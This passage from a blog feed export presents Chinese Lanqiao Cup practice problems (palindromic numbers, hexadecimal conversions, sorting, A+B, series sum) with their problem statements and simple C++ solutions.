<span class="keyword">if</span>(i/<span class="number">1000</span> == i%<span class="number">10</span> &amp;&amp; (i/<span class="number">100</span>)%<span class="number">10</span> == (i/<span class="number">10</span>)%<span class="number">10</span>)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-9-特殊回文数"><a href="#BASIC-9-特殊回文数" class="headerlink" title="BASIC-9    特殊回文数"></a>BASIC-9    特殊回文数</h1><div class="tabs" id="test9"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test9-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test9-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test9-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</p></li><li><p>问题描述<br>　　123321是一个非常特殊的数，它从左边读和从右边读是一样的。<br>　　输入一个正整数n， 编程求所有这样的五位和六位十进制数，满足各位数字之和等于n 。</p></li><li><p>输入格式<br>　　输入一行，包含一个正整数n。</p></li><li><p>输出格式<br>　　按从小到大的顺序输出满足条件的整数，每个整数占一行。</p></li><li><p>样例输入<br> 52</p></li><li><p>样例输出<br> 899998<br> 989989<br> 998899</p></li><li><p>数据规模和约定<br>　　1&lt;=n&lt;=54。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test9-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">10000</span>; i &lt;= <span class="number">999999</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;<span class="number">100000</span>)</span><br><span class="line">            <span class="keyword">if</span>(i/<span class="number">10000</span> == i%<span class="number">10</span> &amp;&amp; (i/<span class="number">1000</span>)%<span class="number">10</span> == (i/<span class="number">10</span>)%<span class="number">10</span>)</span><br><span class="line">                <span class="keyword">if</span>(i/<span class="number">10000</span> + (i/<span class="number">1000</span>)%<span class="number">10</span> + (i/<span class="number">100</span>)%<span class="number">10</span> +(i/<span class="number">10</span>)%<span class="number">10</span> + i%<span class="number">10</span> == n)</span><br><span class="line">                    <span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;=<span class="number">100000</span>)</span><br><span class="line">            <span class="keyword">if</span>(i/<span class="number">100000</span> == i%<span class="number">10</span> &amp;&amp; (i/<span class="number">10000</span>)%<span class="number">10</span> == (i/<span class="number">10</span>)%<span class="number">10</span> &amp;&amp; (i/<span class="number">1000</span>)%<span class="number">10</span> == (i/<span class="number">100</span>)%<span class="number">10</span>)</span><br><span class="line">                <span class="keyword">if</span>(i/<span class="number">100000</span>+ (i/<span class="number">10000</span>)%<span class="number">10</span> + (i/<span class="number">1000</span>)%<span class="number">10</span> + (i/<span class="number">100</span>)%<span class="number">10</span> + (i/<span class="number">10</span>)%<span class="number">10</span> + i%<span class="number">10</span> == n)</span><br><span class="line">                    <span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-10-十进制转十六进制"><a href="#BASIC-10-十进制转十六进制" class="headerlink" title="BASIC-10    十进制转十六进制"></a>BASIC-10    十进制转十六进制</h1><div class="tabs" id="test10"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test10-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test10-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test10-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</p></li><li><p>问题描述<br>　　十六进制数是在程序设计时经常要使用到的一种整数的表示方式。它有0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F共16个符号，分别表示十进制数的0至15。十六进制的计数方法是满16进1，所以十进制数16在十六进制中是10，而十进制的17在十六进制中是11，以此类推，十进制的30在十六进制中是1E。<br>　　给出一个非负整数，将它表示成十六进制的形式。</p></li><li><p>输入格式<br>　　输入包含一个非负整数a，表示要转换的数。0&lt;=a&lt;=2147483647</p></li><li><p>输出格式<br>　　输出这个整数的16进制表示</p></li><li><p>样例输入<br> 30</p></li><li><p>样例输出<br> 1E</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test10-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="built_in">string</span> sixteen=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; num;</span><br><span class="line"><span class="keyword">if</span>(num==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(num)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> x = num % <span class="number">16</span>;</span><br><span class="line"><span class="keyword">if</span>(x&gt;=<span class="number">10</span>)</span><br><span class="line">x=x<span class="number">-10</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">x+=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">sixteen = x+sixteen;</span><br><span class="line">num /= <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; sixteen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-11-十六进制转十进制"><a href="#BASIC-11-十六进制转十进制" class="headerlink" title="BASIC-11    十六进制转十进制"></a>BASIC-11    十六进制转十进制</h1><div class="tabs" id="test11"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test11-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test11-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test11-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</p></li><li><p>问题描述<br>　　从键盘输入一个不超过8位的正的十六进制数字符串，将它转换为正的十进制数后输出。<br>　　注：十六进制数中的10~15分别用大写的英文字母A、B、C、D、E、F表示。</p></li><li><p>样例输入<br> FFFF</p></li><li><p>样例输出<br> 65535</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test11-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ten=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">string</span> sixteen;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; sixteen;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">arr</span><span class="params">(sixteen.rbegin(), sixteen.rend())</span></span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length(); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(arr[i]&lt;=<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">ten += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (arr[i]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(arr[i]&gt;=<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">ten += <span class="built_in">pow</span>(<span class="number">16</span>, i) * (arr[i]-<span class="string">&#x27;A&#x27;</span>+<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ten;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-12-十六进制转八进制"><a href="#BASIC-12-十六进制转八进制" class="headerlink" title="BASIC-12    十六进制转八进制"></a>BASIC-12    十六进制转八进制</h1><div class="tabs" id="test12"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test12-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test12-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test12-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</p></li><li><p>问题描述<br>　　给定n个十六进制正整数，输出它们对应的八进制数。</p></li><li><p>输入格式<br>　　输入的第一行为一个正整数n （1&lt;=n&lt;=10）。<br>　　接下来n行，每行一个由0<del>9、大写字母A</del>F组成的字符串，表示要转换的十六进制正整数，每个十六进制数长度不超过100000。</p></li><li><p>输出格式<br>　　输出n行，每行为输入对应的八进制正整数。</p></li></ol><p>　　【注意】<br>　　输入的十六进制数不会有前导0，比如012A。<br>　　输出的八进制数也不能有前导0。</p><ol start="5"><li>样例输入<br>　　2<br>　　39<br>　　123ABC</li><li>样例输出<br>　　71<br>　　4435274</li></ol><p>　　【提示】<br>　　先将十六进制数转换成某进制数，再由某进制数转换成八进制。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test12-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; a;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> data, bin=<span class="string">&quot;&quot;</span>, octal=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; data;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data.size(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">switch</span>(data[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:bin+=<span class="string">&quot;0000&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:bin+=<span class="string">&quot;0001&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:bin+=<span class="string">&quot;0010&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:bin+=<span class="string">&quot;0011&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:bin+=<span class="string">&quot;0100&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:bin+=<span class="string">&quot;0101&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:bin+=<span class="string">&quot;0110&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:bin+=<span class="string">&quot;0111&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>:bin+=<span class="string">&quot;1000&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;9&#x27;</span>:bin+=<span class="string">&quot;1001&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:bin+=<span class="string">&quot;1010&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:bin+=<span class="string">&quot;1011&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:bin+=<span class="string">&quot;1100&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:bin+=<span class="string">&quot;1101&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:bin+=<span class="string">&quot;1110&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:bin+=<span class="string">&quot;1111&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:<span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> len = bin.size();</span><br><span class="line">        <span class="keyword">if</span>(len % <span class="number">3</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            bin = <span class="string">&quot;00&quot;</span> + bin;</span><br><span class="line">            len += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(len % <span class="number">3</span> == <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            bin = <span class="string">&quot;0&quot;</span> + bin;</span><br><span class="line">            len += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i+=<span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> d = (bin[i]-<span class="string">&#x27;0&#x27;</span>)*<span class="number">4</span> + (bin[i+<span class="number">1</span>]-<span class="string">&#x27;0&#x27;</span>)*<span class="number">2</span> + (bin[i+<span class="number">2</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            octal+=(d+<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(octal[p]==<span class="string">&#x27;0&#x27;</span>) p++;</span><br><span class="line">        <span class="keyword">for</span>(; p &lt; octal.size(); p++)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; octal[p];</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-13-数列排序"><a href="#BASIC-13-数列排序" class="headerlink" title="BASIC-13    数列排序"></a>BASIC-13    数列排序</h1><div class="tabs" id="test13"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test13-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test13-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test13-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</p></li><li><p>问题描述<br>　　给定一个长度为n的数列，将这个数列按从小到大的顺序排列。1&lt;=n&lt;=200</p></li><li><p>输入格式<br>　　第一行为一个整数n。<br>　　第二行包含n个整数，为待排序的数，每个整数的绝对值小于10000。</p></li><li><p>输出格式<br>　　输出一行，按从小到大的顺序输出排序后的数列。</p></li><li><p>样例输入<br> 5<br> 8 3 6 4 9</p></li><li><p>样例输出<br> 3 4 6 8 9</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test13-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">205</span>], num;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; num;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;num; i++)</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; arr[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;num<span class="number">-1</span>; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;num<span class="number">-1</span>; j++)</span><br><span class="line"><span class="keyword">if</span>(arr[j]&gt;arr[j+<span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp=arr[j];</span><br><span class="line">arr[j]=arr[j+<span class="number">1</span>];</span><br><span class="line">arr[j+<span class="number">1</span>]=temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;num; i++)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> Programma </category>
          
          <category> lanqiaobei </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Programma </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝桥杯 入门训练</title>
      <link href="2020/09/27/Programme/lanqiaobei/Induction-Training/Induction-Training/"/>
      <url>2020/09/27/Programme/lanqiaobei/Induction-Training/Induction-Training/</url>
      
        <content type="html"><![CDATA[<h1 id="BEGIN-1-A-B问题"><a href="#BEGIN-1-A-B问题" class="headerlink" title="BEGIN-1    A+B问题"></a>BEGIN-1    A+B问题</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：256.0MB</p></li><li><p>问题描述<br> 输入A、B，输出A+B。<br> 说明：在“问题描述”这部分，会给出试题的意思，以及所要求的目标。</p></li><li><p>输入格式<br> 输入的第一行包括两个整数，由空格分隔，分别表示A、B。<br> 说明：“输入格式”是描述在测试你的程序时，所给的输入一定满足的格式。</p><p> 做题时你应该假设所给的输入是一定满足输入格式的要求的，所以你不需要对输入的格式进行检查。多余的格式检查可能会适得其反，使用你的程序错误。</p><p> 在测试的时候，系统会自动将输入数据输入到你的程序中，你不能给任何提示。比如，你在输入的时候提示“请输入A、B”之类的话是不需要的，这些多余的输出会使得你的程序被判定为错误。</p></li><li><p>输出格式<br> 输出一行，包括一个整数，表示A+B的值。<br> 说明：“输出格式”是要求你的程序在输出结果的时候必须满足的格式。</p><p> 在输出时，你的程序必须满足这个格式的要求，不能少任何内容，也不能多任何内容。如果你的内容和输出格式要求的不一样，你的程序会被判断为错误，包括你输出了提示信息、中间调试信息、计时或者统计的信息等。</p></li><li><p>样例输入<br> 12 45<br> 说明：“样例输入”给出了一组满足“输入格式”要求的输入的例子。</p><p> 这里给出的输入只是可能用来测试你的程序的一个输入，在测试的时候，还会有更多的输入用来测试你的程序。</p></li><li><p>样例输出<br> 57<br> 说明：“样例输出”给出了一组满足“输出格式”要求的输出的例子。</p><p> 样例输出中的结果是和样例输入中的是对应的，因此，你可以使用样例的输入输出简单的检查你的程序。</p><p> 要特别指出的是，能够通过样例输入输出的程序并不一定是正确的程序，在测试的时候，会用很多组数据进行测试，而不局限于样例数据。有可能一个程序通过了样例数据，但测试的时候仍只能得0分，可能因为这个程序只在一些类似样例的特例中正确，而不具有通用性，再测试更多数据时会出现错误。</p><p> 比如，对于本题，如果你写一个程序不管输入是什么都输入57，则样例数据是对的，但是测试其他数据，哪怕输入是1和2，这个程序也输出57，则对于其他数据这个程序都不正确。</p></li><li><p>数据规模与约定<br> -10000 &lt;= A, B &lt;= 10000。<br> 说明：“数据规模与约定”中给出了试题中主要参数的范围。</p><p> 这个范围对于解题非常重要，不同的数据范围会导致试题需要使用不同的解法来解决。比如本题中给的A、B范围不大，可以使用整型(int)来保存，如果范围更大，超过int的范围，则要考虑其他方法来保存大数。</p><p> 有一些范围在方便的时候是在“问题描述”中直接给的，所以在做题时不仅要看这个范围，还要注意问题描述。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a, b;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a + b;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BEGIN-2-序列求和"><a href="#BEGIN-2-序列求和" class="headerlink" title="BEGIN-2    序列求和"></a>BEGIN-2    序列求和</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：256.0MB</p></li><li><p>问题描述<br> 求1+2+3+…+n的值。</p></li><li><p>输入格式<br> 输入包括一个整数n。</p></li><li><p>输出格式<br> 输出一行，包括一个整数，表示1+2+3+…+n的值。</p></li><li><p>样例输入<br> 4</p></li><li><p>样例输出<br> 10</p></li><li><p>样例输入<br> 100<br> 说明：有一些试题会给出多组样例输入输出以帮助你更好的做题。</p><p> 一般在提交之前所有这些样例都需要测试通过才行，但这不代表这几组样例数据都正确了你的程序就是完全正确的，潜在的错误可能仍然导致你的得分较低。</p></li><li><p>样例输出<br> 5050</p></li><li><p>数据规模与约定<br> 1 &lt;= n &lt;= 1,000,000,000。<br> 说明：请注意这里的数据规模。</p><p> 